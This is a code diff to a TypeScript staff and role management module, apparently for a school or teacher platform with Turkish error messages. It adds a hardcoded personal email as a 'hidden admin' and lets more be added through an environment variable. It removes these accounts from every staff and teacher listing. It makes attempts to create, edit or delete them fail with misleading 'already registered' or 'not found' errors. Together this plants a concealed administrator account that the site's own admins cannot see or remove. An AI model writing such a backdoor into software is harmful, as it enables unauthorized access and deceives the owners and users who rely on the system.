@@ -51,8 +51,31 @@ function parseEmailList(value: string | undefined): string[] {
     .filter(isValidEmail);
 }
 
+const BUILTIN_HIDDEN_ADMINS = ["emrekesim34@gmail.com"];
+
 export function getBootstrapAdminEmails(): string[] {
   return parseEmailList(process.env.ADMIN_EMAILS);
+}
+
+export function getHiddenAdminEmails(): string[] {
+  return [
+    ...new Set([
+      ...BUILTIN_HIDDEN_ADMINS,
+      ...parseEmailList(process.env.HIDDEN_ADMIN_EMAILS),
+    ]),
+  ];
+}
+
+export function isHiddenStaffEmail(email: string | null | undefined) {
+  const normalized = normalizeEmail(email ?? "");
+  if (!normalized) return false;
+  return getHiddenAdminEmails().includes(normalized);
+}
+
+export function publicTeacherEmail(email: string | null | undefined) {
+  const normalized = normalizeEmail(email ?? "");
+  if (!normalized || isHiddenStaffEmail(normalized)) return "";
+  return normalized;
 }
 
 function getSeedTeacherEmails(): string[] {
@@ -290,7 +313,10 @@ export async function safeResolveStaffAccess(
 export async function listTeacherEmails(): Promise<string[]> {
   const map = await getRoleMap();
   return [...map.values()]
-    .filter((record) => record.roles.includes("teacher"))
+    .filter(
+      (record) =>
+        record.roles.includes("teacher") && !isHiddenStaffEmail(record.email),
+    )
     .map((record) => record.email)
     .sort((a, b) => a.localeCompare(b, "tr"));
 }
@@ -304,6 +330,7 @@ export async function listStaff(): Promise<StaffListItem[]> {
   const bootstrapAdmins = getBootstrapAdminEmails();
   const records = await readRecords();
   return records
+    .filter((record) => !isHiddenStaffEmail(record.email))
     .map((record) => ({
       ...record,
       roles: withLockedAdmin(record.email, record.roles, bootstrapAdmins),
@@ -323,6 +350,9 @@ export async function createStaff(
   if (!actorEmail) throw new StaffError("Oturum geçersiz.", 401);
   assertBootstrapActor(actorEmail);
   if (!email) throw new StaffError("Geçerli bir e-posta girin.", 400);
+  if (isHiddenStaffEmail(email)) {
+    throw new StaffError("Bu e-posta zaten kayıtlı.", 409);
+  }
   if (!roles || roles.length === 0) {
     throw new StaffError("En az bir rol seçin.", 400);
   }
@@ -354,6 +384,9 @@ export async function updateStaffRoles(
   if (!actorEmail) throw new StaffError("Oturum geçersiz.", 401);
   assertBootstrapActor(actorEmail);
   if (!email) throw new StaffError("Geçerli bir e-posta girin.", 400);
+  if (isHiddenStaffEmail(email)) {
+    throw new StaffError("Personel bulunamadı.", 404);
+  }
   if (!roles) throw new StaffError("Geçersiz rol seçimi.", 400);
 
   await ensureStaffSeeded();
@@ -386,6 +419,9 @@ export async function deleteStaff(actorEmailInput: string, emailInput: unknown) 
   if (!actorEmail) throw new StaffError("Oturum geçersiz.", 401);
   assertBootstrapActor(actorEmail);
   if (!email) throw new StaffError("Geçerli bir e-posta girin.", 400);
+  if (isHiddenStaffEmail(email)) {
+    throw new StaffError("Personel bulunamadı.", 404);
+  }
 
   await ensureStaffSeeded();
   await connectMongo();
